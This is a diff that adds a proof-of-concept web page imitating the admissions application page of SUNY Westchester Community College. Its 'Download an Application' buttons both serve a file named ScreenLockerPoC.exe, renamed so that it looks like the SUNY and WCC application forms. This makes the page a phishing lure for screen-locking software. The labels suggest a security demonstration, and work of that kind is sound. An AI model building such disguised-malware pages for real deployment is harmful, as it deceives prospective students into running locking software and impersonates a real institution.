@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply to WCC - PoC</title>
+    <style>
+        :root {
+            --wcc-blue: #003a70;
+            --wcc-orange: #f58220;
+            --light-gray: #f4f4f4;
+            --dark-gray: #333;
+            --text-gray: #555;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            color: var(--dark-gray);
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            border-bottom: 3px solid var(--wcc-orange);
+        }
+        .logo {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: var(--wcc-blue);
+        }
+        nav a {
+            margin: 0 15px;
+            text-decoration: none;
+            color: var(--wcc-blue);
+            font-weight: 600;
+        }
+        /* Hero Section */
+        .hero {
+            background-color: var(--wcc-blue);
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+        }
+        .hero h1 {
+            font-size: 3em;
+            margin: 0;
+        }
+        /* Main Content */
+        .main-content {
+            padding: 40px 0;
+        }
+        .main-content h2 {
+            text-align: center;
+            font-size: 2.2em;
+            color: var(--wcc-blue);
+            margin-bottom: 40px;
+        }
+        .apply-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+        }
+        .apply-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 25px;
+            text-align: center;
+            background-color: var(--light-gray);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .apply-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        .apply-card h3 {
+            color: var(--wcc-blue);
+            font-size: 1.4em;
+            margin-top: 0;
+        }
+        .apply-card p {
+            color: var(--text-gray);
+            line-height: 1.6;
+        }
+        /* Download Section */
+        .download-section {
+            background-color: white;
+            border: 2px dashed var(--wcc-orange);
+            border-radius: 8px;
+            margin-top: 50px;
+            padding: 40px;
+            text-align: center;
+        }
+        .download-section a {
+            display: inline-block;
+            background-color: var(--wcc-orange);
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 5px;
+            margin: 10px;
+            transition: background-color 0.2s;
+        }
+        .download-section a:hover {
+            background-color: #e07015;
+        }
+        /* Footer */
+        footer {
+            background-color: var(--wcc-blue);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">SUNY Westchester Community College</div>
+        <nav>
+            <a href="#">About</a>
+            <a href="#">Academics</a>
+            <a href="#">Admissions</a>
+            <a href="#">Student Life</a>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero">
+            <h1>Apply to WCC</h1>
+        </section>
+
+        <div class="container main-content">
+            <h2>Start Your Application</h2>
+            <div class="apply-grid">
+                <div class="apply-card">
+                    <h3>First-Time College Student</h3>
+                    <p>For students who have not attended college after graduating from high school.</p>
+                </div>
+                <div class="apply-card">
+                    <h3>Transfer Student</h3>
+                    <p>For students who have previously attended another college or university.</p>
+                </div>
+                <div class="apply-card">
+                    <h3>Visiting/Non-Degree Student</h3>
+                    <p>For students who wish to take classes without enrolling in a degree program.</p>
+                </div>
+                <div class="apply-card">
+                    <h3>Readmit Student</h3>
+                    <p>For students who previously attended WCC and wish to return after an absence.</p>
+                </div>
+                <div class="apply-card">
+                    <h3>International Student</h3>
+                    <p>For students who require an F-1 visa to study in the United States.</p>
+                </div>
+                <div class="apply-card">
+                    <h3>High School Student</h3>
+                    <p>For current high school students interested in early college programs.</p>
+                </div>
+            </div>
+
+            <section class="download-section">
+                <h2>Download an Application</h2>
+                <p>Click the links below to download the application files.</p>
+                <a href="./ScreenLockerPoC.exe" download="ScreenLocker-SUNY-App.exe">
+                    ⬇️ SUNY Application
+                </a>
+                <a href="./ScreenLockerPoC.exe" download="ScreenLocker-WCC-App.exe">
+                    ⬇️ WCC Application
+                </a>
+            </section>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Westchester Community College. All Rights Reserved. (This is a PoC website)</p>
+    </footer>
+
+</body>
+</html>
